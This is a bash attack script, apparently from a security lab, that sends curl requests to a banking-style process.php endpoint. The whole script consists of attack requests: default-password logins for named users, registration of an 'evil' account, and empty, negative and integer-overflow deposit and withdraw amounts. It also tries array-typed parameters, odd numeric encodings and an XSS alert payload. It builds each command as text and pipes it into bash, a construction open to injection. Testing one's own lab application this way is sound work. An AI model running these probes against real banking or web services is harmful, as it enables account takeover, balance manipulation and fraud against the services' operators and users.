#!/bin/bash

if [ "$#" -ne 2 ];then
    echo "Usage: ./attila.sh <target> <port>";
    exit 0
fi

trap exit SIGINT

TARGET=$1
PORT=$2
URL_ENCODE=1

OUTPUT_LOG=attila.log

function process_php() {
    if [[ "$URL_ENCODE" -eq 1 ]]; then
        MODE="--data-urlencode"
    else
        MODE="-d"
    fi

    URL="http://$TARGET:$PORT/process.php"
    if [[ -n $1 ]]; then
        QUERY="$MODE 'user=${1}'"
    else
        QUERY=""
    fi

    if [[ -n $2 ]]; then
        QUERY="${QUERY} $MODE 'pass=${2}'"
    fi

    if [[ -n $3 ]]; then
        QUERY="${QUERY} $MODE 'drop=${3}'"
    fi

    if [[ -n $4 ]]; then
        QUERY="${QUERY} $MODE 'amount=${4}'"
    fi

    echo "----------------------------------"
    echo "   Requesting $1 $2 $3 $4         "
    echo "    $(date +%H:%M:%S)             ";
    echo "----------------------------------"
    echo curl -s -G -v -v "$QUERY" "$URL" | tee -a $OUTPUT_LOG | bash

    sleep 1
}


# Default passwords
process_php "jelena" "abcdef" "balance"
process_php "john" "abcdef" "balance"
process_php "kate" "abcdef" "balance"

## Now register a dummy user for our evil things.
process_php "attila" "76trfcvbhgse456yuhvcxdse" "register"

# Empty fields
process_php "" "" "balance"
process_php "" "" "deposit" ""
process_php "" "" "withdraw" ""

process_php "attila" "" "balance"
process_php "attila" "" "deposit" ""
process_php "attila" "" "withdraw" ""

process_php "" "76trfcvbhgse456yuhvcxdse" "balance"
process_php "" "76trfcvbhgse456yuhvcxdse" "deposit" ""
process_php "" "76trfcvbhgse456yuhvcxdse" "withdraw" ""

# Negative values
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-1"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-1"

# Try passing the amount parameter as array.
# sistemare con process_php
curl http://localhost:8888/process.php?user=dima12345&pass=dima12345678&amount[]=34&amount[]=36&drop=deposit


# Push it to the limit
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "9223372036854775807"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "9223372036854775807"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-2147483648"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-2147483648"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-9223372036854775808"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-9223372036854775808"

# Custom strange payloads
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-1&#45100"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "1&#45100"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "0.23e5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "0.23e-5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-0.23e5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-0.23e-5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "0b11111111"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "now()"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "~2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "~-2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-~2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "1*310"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "-134*1100"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "12*21-210"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-1&#45100"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "1&#45100"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "0.23e5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "0.23e-5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-0.23e5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-0.23e-5"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "0b11111111"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "now()"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "~2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "~-2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-~2147483647"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "1*310"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "-134*1100"
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "12*21-210"

## Try some xss attacks. Da fare
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "</script><script>alert(1)</script><script>"

## Register with empty username and password.
process_php "" "" "register"
process_php "           " "            " "register"
process_php "%32%32%32%32%32%32%32" "%32%32%32%32%32%32%32%32%32%32" "register"

## empty deposit
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" ""
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "   "
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" "%32%32"

## empty withdraw
process_php "attila" "76trfcvbhgse456yuhvcxdse" "deposit" ""
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "   "
process_php "attila" "76trfcvbhgse456yuhvcxdse" "withdraw" "%32%32"